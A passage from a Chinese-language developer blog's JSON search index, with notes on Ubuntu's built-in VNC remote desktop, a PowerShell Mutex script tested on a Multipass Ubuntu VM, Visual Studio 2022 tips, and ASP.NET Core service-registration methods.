","date":"2022-12-28","objectID":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/:7:0","tags":["ubuntu","linux","windows"],"title":"在 Ubuntu KVM 安裝 Window Server 2022","uri":"/blog/posts/%E5%9C%A8-Ubuntu-KVM-%E5%AE%89%E8%A3%9D-Window-Server-2022/"},{"categories":["Linux"],"content":"最近嘗試了 Ubuntu 遠端方法，發現 VNC 有很多種方式。這邊嘗試很多種方法，很多都會登入會閃退，不然就要裝 xfce4 能成功，但桌面好像會有一些問題，最後採用原生方法，這邊就紀錄一下。 ","date":"2022-12-28","objectID":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/:0:0","tags":["linux","ubuntu","mstsc","vnc"],"title":"Ubuntu 20.04 內建遠端方法","uri":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"遠端設定步驟 設定 → sharing，上面開關要打勾 點擊遠端桌面，設定相關設定 很簡單就完成。但這邊你會發現有一個好像是 Windows 遠端用，但經過我測試會失敗，目前也沒找到方法。 ","date":"2022-12-28","objectID":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/:1:0","tags":["linux","ubuntu","mstsc","vnc"],"title":"Ubuntu 20.04 內建遠端方法","uri":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"VNC Viewer 無法連線問題 VNC Viewer 出现 RFB protocol error: invalid message type 255 的解决办法 - 玩客 微軟遠端工具怎麼測試還是無法使用。 ","date":"2022-12-28","objectID":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/:2:0","tags":["linux","ubuntu","mstsc","vnc"],"title":"Ubuntu 20.04 內建遠端方法","uri":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"防止 VNC 突然關閉(啟用自動登入和休眠) 點選 User 按下解除按鈕，啟用自動登入。 關閉自動登出、鎖屏 題外話，話說想裝 noVNC，但沒想到安裝連線登入 VNC 網頁版會失敗，然後 Server 也會跟著掛，所以用這個就不能用 noVNC 喔。 ","date":"2022-12-28","objectID":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/:3:0","tags":["linux","ubuntu","mstsc","vnc"],"title":"Ubuntu 20.04 內建遠端方法","uri":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 How to enable Screen Sharing on Ubuntu 20.04 LTS 如何在Ubuntu 20.04上启用自动登录？ - A5数据 VNC server配置 - 珂珂keo - 博客園 推薦可以看一下裡面文章，我看怎麼有這麼多種 VNC，裡面有介紹一些東西。原本要用x11vnc，但後來用原生。 vnc簡介 VNC 由AT\u0026T 的劍橋研究實驗室開發，可實現遠程圖像顯示和控制。 VNC可是指一種通信協議——Virtual Network Computing，也代指實現這種協議的工具——Virtual Network Console（ 虛擬網絡控制台）。 VNC工具分為服務端和客戶端，服務端提供兩種服務方式： 物理會話：直接控制物理顯示器顯示的內容，所有連接上的用戶看到的是同一圖像。 虛擬會話：同時運行多個虛擬會話，各個會話圖像不同。 常見VNC實現 VNC作為一種通用協議，現有多種實現工具： TigerVNC TightVNC的分支，取代原TightVNC，虛擬會話使用Xvnc，物理會話使用x0vncserver。 如今Linux發行版中最常用的VNC實現（一些發行版中安裝vncserver包即是安裝tigervnc）。tigervnc包含一個vnc客戶端vncviewer。 TurboVNC TightVNC的分支，特點是對圖形傳輸方面的優化。 RealVNC 2002年劍橋研究室實驗室關閉，後來VNC的創始人創立的RealVNC公司開發的產品，客戶端可以通過該產品的服務器連接服務端，提供商用版本，以及有一定限制的免費版本。 vino及vinagre GNOME項目的子項目，vino為服務端，vinagre為客戶端（還支持SPICE、RDP、SSH等協議） x11vnc 僅為實現X11的服務端。 ","date":"2022-12-28","objectID":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/:4:0","tags":["linux","ubuntu","mstsc","vnc"],"title":"Ubuntu 20.04 內建遠端方法","uri":"/blog/posts/Ubuntu-20.04-%E5%85%A7%E5%BB%BA%E9%81%A0%E7%AB%AF%E6%96%B9%E6%B3%95/"},{"categories":["PowerShell"],"content":"平常我們很常寫程式都會設主程式，會有同時執行 Issue。這邊最近找到用 PowerShell 防止同時執行方法，但後來還是遇到一些問題，所以就不使用了。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:0:0","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"第一次用的人需要開權限 請參考: PowerShell 更改執行原則，解決無法執行 ps1 指令稿問題 - Office 指南 Set-ExecutionPolicy RemoteSigned ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:1:0","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"使用 Mutex 參考:讓powershell同時只能運行一個腳本（進程互斥例子） - PowerShell免費軟件 - 博客園 # PowerShell 進程（腳本）互斥的例子 $互斥名字 = 'Global\\我代號為天王蓋地虎' $建立互斥成功否 = $flase $互斥對象 = New-Object System.Threading.Mutex ($true,$互斥名字,[ref]$建立互斥成功否) if ($建立互斥成功否) { write-host '互斥成功，開始幹活!' start-sleep -Seconds 60 #你的任務 $互斥對象.ReleaseMutex() | Out-Null $互斥對象.Dispose() | Out-Null write-host '活幹完了，釋放' } else { # 每個互斥腳本必須單獨佔用一個進程！powershell傳教士 win7 ,win10, powershell core v6.0 beta8 on linux測試通過 write-host '互斥失敗 !' } ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:2:0","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"後續我沒有使用這個方法 我發現我寫在我動態排程啟動器，發現執行第一次後，後續不一定次數後 Mutex 功能會失效，得到資訊都會是 false。這邊就不使用這個方法。至於發生什麼問題我還沒找到原因，但我猜是鎖壞掉了，可能沒解鎖到。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:2:1","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"Linux 是否也能使用? 我使用 Multipass 用虛擬 Ubuntu 安裝 PowerShell 試試看。這邊我估計是可行的。 之前 Switch Lan play 模擬區往連線遊玩 - 程式狂想筆記 - 記錄著我接觸程式藝文 就有玩過 Multipass ，所以就決定用這個簡單做測試。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:0","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"安裝 Multipass 啟動虛擬機 # 安裝 multipass sudo snap install multipass multipass launch --name foo multipass shell foo ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:1","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"安裝 PowerShell 參考: 在 Ubuntu 上安裝 PowerShell - PowerShell | Microsoft Learn 這邊注意下面指令可以要分開複製執行喔 # Update the list of packages sudo apt-get update # Install pre-requisite packages. sudo apt-get install -y wget apt-transport-https software-properties-common # Download the Microsoft repository GPG keys wget -q \"https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb\" # Register the Microsoft repository GPG keys sudo dpkg -i packages-microsoft-prod.deb # Update the list of packages after we added packages.microsoft.com sudo apt-get update # Install PowerShell sudo apt-get install -y powershell # Start PowerShell pwsh 或參考離線安裝 可以簡單確定是否能執行。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:2","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"複製檔案到 Ubutnu 主機 scp .\\test.ps1 {user}@192.168.1.118:. 詳細可以看Windows 10 - PowerShell - 使用 scp 复制文件到 CentOS 7_土拨鼠啊啊啊的博客-CSDN博客_powershell scp。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:3","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"檔案傳到虛擬機 參考: multipass transfer command | Multipass documentation multipass transfer test.ps1 foo:. ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:4","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"執行測試 果然可以進行執行。當初怕這種東西可能無法用在跨平台，沒想到竟然可以，看來是我的多想。 ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:3:5","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":["PowerShell"],"content":"相關文章 防止程式同時執行多份，比檢查Process清單更好的方法-黑暗執行緒 C#如何防止程式多次執行的技巧 - IT閱讀 PowerShell 學習筆記-黑暗執行緒 .NET 中使用 Mutex 进行跨越进程边界的同步 - walterlv - 博客园 让powershell同时只能运行一个脚本（进程互斥例子） - PowerShell免费软件 - 博客园 Three ways to run .exe files in PowerShell Powershell: check variable for null - Thomas Maurer ","date":"2022-12-27","objectID":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/:4:0","tags":["powershell","mutex"],"title":"PowerShell 防止同時執行程式(使用Mutex)","uri":"/blog/posts/PowerShell-%E9%98%B2%E6%AD%A2%E5%90%8C%E6%99%82%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F-%E4%BD%BF%E7%94%A8Mutex/"},{"categories":[".Net Core"],"content":"之前寫程式沒有用過 Visual Studio 程式，之前沒寫過 Net Core 所以就對 Visual Studio 非常不熟，最近跳進這個坑，就需要了解這個東西，這邊做個紀錄，忘記可以回來看。 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:0:0","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"Visual Studio 安裝 2022 下載與安裝須看網路速度，正常估計 20 分鐘吧。安裝就不詳細寫流程，直接看圖片，不同版本安裝方法可能也不太一樣。 這邊選個中文 接下來要度過漫長的安裝。 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:1:0","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":".NET Core 下載 https://dotnet.microsoft.com 舊版本可以在裡面下載。 .NET 下载(Linux、macOS 和 Windows) ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:0","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"Visual Studio 2022 使用 選擇Not now, maybe later。 這邊可以選擇 .NET Core 版本 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:0","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"選擇中文 因為我用 Windows Sandbox ，所以系統介面是英文，正常應該不用。 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:1","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"字型推薦 使用 Consolas。 參考: mrkt 的程式學習筆記: 換個好字型讓程式開發有效率 Visual studio 環境設定 —— 字型、套件、快捷鍵 | 伊果的沒人看筆記本 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:2","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"安裝建議 Visual Studio Ultimate 2012 提供的 DGML (Directed Graph Markup Language)好像很好用，可惜免費板沒有。 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:3","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"快捷鍵(推薦) Ctrl + K + D 自動排版。 Ctrl + J 顯示 InteliSense Ctrl + , 搜尋程式碼。 Ctrl + K + C 注解。 Ctrl + K + U 取消注解。 Ctrl + [ + s 當前檔案位置。 Ctrl + . 快速執行動作。 Ctrl + . 在所在行 新增 using namespace 參考:visual studio自动导入 using 的快捷键_diaoshandun0123的博客-CSDN博客 Ctrl + M + P Ctrl+R AND Ctrl+G移除沒用到的 using namespace 參考:How to automatically sort and remove unused imports in Visual Studio? - Stack Overflow F5 偵錯 F6 建置 更多可以查看: Visual Studio Tips for Software Developers ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:4","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"快速搜尋 @opt - 選項 @cmd - 命令 @mru - 最近使用 @doc - 開啟檔 參考: 鍵盤和滑鼠快速鍵 - Visual Studio (Windows) | Microsoft Docs ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:5","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"實用功能 呼叫階層: 在方法右鍵=\u003e檢視呼叫階層，查看「呼叫目標」。 類別檢視: 以專案為單位，顯示所有專案 Class。 物件瀏覽器: 所有專案可用物件。 SQL Server 物件管理: 資料庫比較，注意下面按鈕。 工作清單: TODO 列表。 工具-\u003e 程式碼片段管理員: 查看 Code Snippets ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:6","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"Code snippets 打下面 關鍵字，按下 tab 可以產生程式代碼。 prop ctor … 可參考: C# code snippets - Visual Studio (Windows) | Microsoft Docs ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:7","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"顯示 log 平常我們在寫程式都會下 Log，一般 Show Console上面只要下 Console.WriteLine(\"Hello World\");。但這個也不會產生 Log 檔案，也不會有分 Log 顆粒度。System.Diagnostics 也可以用於寫 Log，但一般不會這樣用。正常會用第三方 Log 套件。這篇就先不紀錄。 mrkt 的程式學習筆記: NLog 輸出記錄資訊到 Visual Studio Output 視窗 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:8","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"常見設定調整 所有檔案顯示行號。 建置開始時顯示輸出視窗。(2022已預設) Web 專案使用64位元(2022已預設) 控制build設定調整 檢視檔案右邊索引新增tab。 選擇語系 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:9","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"彩蛋 未來學習版本。 ASP.NET Core ASP.NET Core MVC ASP.NET Core Identity Entity Framework Core dbeaver链接localDB_闪耀星星的博客-CSDN博客 ","date":"2022-12-24","objectID":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:0","tags":[".netcore"],"title":".Net Core 和 Visual Studio 2022 安裝設定與使用技巧","uri":"/blog/posts/Net-Core-%E5%92%8C-Visual-Studio-2022-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E8%88%87%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"categories":[".Net Core"],"content":"之前寫.NET Core MVC裡面探討Services.AddMvc 和Services.AddMvcCore方法差異。 這邊只有簡單紀錄重點。 addMvcCore: 只包含MVC功能。所以Controller 用到JSON 回傳會錯誤。 addMvc: 包含MVC Core和相關第三方常用服務方法。 最近建立空白專案，發現所有 Startup.cs 都是空的。瞬間不知道要放什麼… 還是了解一下這些事做什麼，主要記錄這篇以後使用知道自己在幹嘛 ","date":"2022-12-21","objectID":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/:0:0","tags":[".netcore","router"],"title":"Net Core 路由設定探討","uri":"/blog/posts/Net-Core-%E8%B7%AF%E7%94%B1%E8%A8%AD%E5%AE%9A%E6%8E%A2%E8%A8%8E/"},{"categories":[".Net Core"],"content":"Service 註冊設定 其實我後來發現 Visual Studio 會建議你設定 Services.AddMvc。 這個功能是最多的 Routing in ASP.NET Core | Microsoft Docs 設定我發現還滿多的 services.AddMvcCore() services.AddControllers() services.AddControllersWithViews() services.AddRazorPages() services.AddMvc() 這邊小記ASP.NET Core 練習 - 在 Razor Pages 專案加入 MVC-黑暗執行緒內容。 services.AddMvcCore() 只註冊運行 Controller/~~Razor Pages~~ 必要的核心服務，確保 Pipeline 程序可動作，其餘如像 Data Annotation Model Validation、身分驗證等服務要自己加掛，除有特殊客製需求，一般不太常用。 services.AddControllers() 包含 AddMvcCore() 所做的動作外，再加上： 身分驗證服務 Swagger/Open API 等 API 文件動態產生功能 Data Annotation 支援 Attribute 資料檢核及 IValidateObject Formatter Mapping - 依 Request 需求提供不同格式(JSON/XML)內容 CORS - 支援跨網域整合 要用 Controller 但不會用到 View，例如純 WebAPI，可以選這個。 services.AddControllersWithViews() 包含 AddControllers() 的所有項目，再加上： cshtml Razor View Cache Tag Helper 要使用標準 Model + View + Controller 架構，通常就選這個。 services.AddRazorPages() 包含 AddMvcCore() 所有功能，再加上： Razor Pages 功能 身分驗證服務 Data Annotation - 支援 Attribute 資料檢核及 IValidateObject Cache Tag Helper services.AddMvc() 等於 AddControllersWithViews() 加 AddRazorPages()，不想漏掉功能發揮 ASP.NET Core 最大威力，選這個就對了。 這邊我懷疑只註冊運行 Controller/Razor Pages 必要的核心服務 寫錯了。 順便問 AI 大神。 最後再做個確認，可以推薦看一下 ASP.NET Core 中 AddMvc() 與 AddMvcCore() 的差別 - Yowko’s Notes這篇，真的去爬程式跑什麼。 現在老了看條列式有點吃力，我依照上面內文簡單用類別圖整理這個。方便以後查詢。 classDiagram AddMvcCore方法 \u003c|-- AddControllers方法 AddControllers方法 \u003c|-- AddControllersWithViews方法 AddMvcCore方法 \u003c|-- AddRazorPages方法 AddRazorPages方法 \u003c|-- AddMvc方法 AddControllersWithViews方法 \u003c|-- AddMvc方法 class AddMvcCore方法{ - 只註冊運行 Controller 必要的核心服務 - 確保 Pipeline 程序可動作 } class AddControllers方法{ - 身分驗證服務 - Swagger/Open API 等 API 文件動態產生功能 - Data Annotation - 支援 Attribute 資料檢核及 IValidateObject - Formatter Mapping - 依 Request 需求提供不同格式[JSON/XML]內容 - CORS - 支援跨網域整合 } class AddControllersWithViews方法{ - cshtml Razor View - Cache Tag Helper } class AddRazorPages方法{ - Razor Pages 功能 - 身分驗證服務 - Data Annotation - 支援 Attribute 資料檢核及 IValidateObject - Cache Tag Helper } class AddMvc方法{ - AddControllersWithViews方法 加 AddRazorPages } 前陣子看微軟範例，我找不到 Controller 對應 View 的方法，後來發現他使用 Razor Pages，cshtml。因為我最近轉寫.Net Core不知道有這玩意，他方法大概有 GET,POST 方法，不過我朋友說現在很少在用。 可以看: AspNetCore.Docs/Index.cshtml.cs at main · dotnet/AspNetCore.Docs AspNetCore.Docs/Startup.cs at main · dotnet/AspNetCore.Docs 我後來仔細看AddRazorPages和AddControllersWithViews方法的東西好像都有包含，看不出來兩者差異，我後來有爬到 [ASP.NET Core] AddController(), AddMvc(), AddControllersWithViews(), AddRazorPages() 차이점 :: 또치의 삽질 보관함 AddController 